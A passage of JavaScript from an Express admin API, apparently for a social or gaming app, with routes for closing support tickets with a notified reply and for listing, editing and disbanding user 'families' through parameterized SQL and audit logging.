  const t = await one(`UPDATE support_tickets SET reply=$2, status='closed', replied_at=now() WHERE id=$1 RETURNING *`, [int(req.params.id), str(req.body.reply, 2000)]);
  if (t?.user_id) {
    await q(`INSERT INTO notifications(user_id, title, body, created_by) VALUES ($1,$2,$3,$4)`, [t.user_id, `Support: ${t.subject}`, t.reply, req.admin.id]);
    toUser(t.user_id, 'notify', { type: 'support', text: t.reply });
  }
  await audit(req, 'support.reply', 'ticket', t?.id);
  res.json(t);
});

// ================= FAMILIES =================
r.get('/admin/families', adminAuth('families'), async (_req, res) => {
  res.json(await q(`SELECT f.*, u.name AS owner_name, u.uid AS owner_uid, (SELECT count(*) FROM family_members m WHERE m.family_id=f.id AND m.role<>'pending')::int AS members
                    FROM families f JOIN users u ON u.id=f.owner_id ORDER BY f.exp DESC LIMIT 500`));
});

r.put('/admin/families/:id', adminAuth('families'), async (req, res) => {
  const id = int(req.params.id);
  const b = req.body;
  if (b.name !== undefined) await q('UPDATE families SET name=$2 WHERE id=$1', [id, str(b.name, 20)]);
  if (b.level !== undefined) await q('UPDATE families SET level=$2 WHERE id=$1', [id, int(b.level, 1)]);
  if (b.max_members !== undefined) await q('UPDATE families SET max_members=$2 WHERE id=$1', [id, int(b.max_members, 50)]);
  if (b.notice !== undefined) await q('UPDATE families SET notice=$2 WHERE id=$1', [id, str(b.notice, 300)]);
  if (b.disband) {
    await q(`UPDATE families SET status='disbanded' WHERE id=$1`, [id]);
    await q('UPDATE users SET family_id=NULL WHERE family_id=$1', [id]);
    await q('DELETE FROM family_members WHERE family_id=$1', [id]);
  }
  await audit(req, 'family.update', 'family', id, b);
  res.json({ ok: true });
});

export default r;
